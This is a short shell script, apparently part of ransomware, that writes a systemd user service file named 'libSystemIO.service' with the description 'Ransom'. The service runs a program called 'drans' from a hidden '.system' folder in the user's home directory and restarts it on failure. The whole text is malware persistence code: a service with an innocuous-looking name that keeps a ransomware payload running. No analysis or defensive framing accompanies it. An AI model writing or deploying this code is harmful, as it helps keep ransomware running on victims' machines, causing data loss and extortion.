echo [Unit] >> ~/.config/systemd/user/libSystemIO.service

echo Description = Ransom >> ~/.config/systemd/user/libSystemIO.service


echo [Service] >> ~/.config/systemd/user/libSystemIO.service

echo ExecStart=/bin/bash /home/$(whoami)/.system/drans -no-browser >> ~/.config/systemd/user/libSystemIO.service

echo Restart=on-failure >> ~/.config/systemd/user/libSystemIO.service

echo SuccessExitStatus=3 4 >> ~/.config/systemd/user/libSystemIO.service

echo RestartForceExitStatus=3 4 >> ~/.config/systemd/user/libSystemIO.service


echo [Install] >> ~/.config/systemd/user/libSystemIO.service

echo WantedBy=multi-user.target >> ~/.config/systemd/user/libSystemIO.service

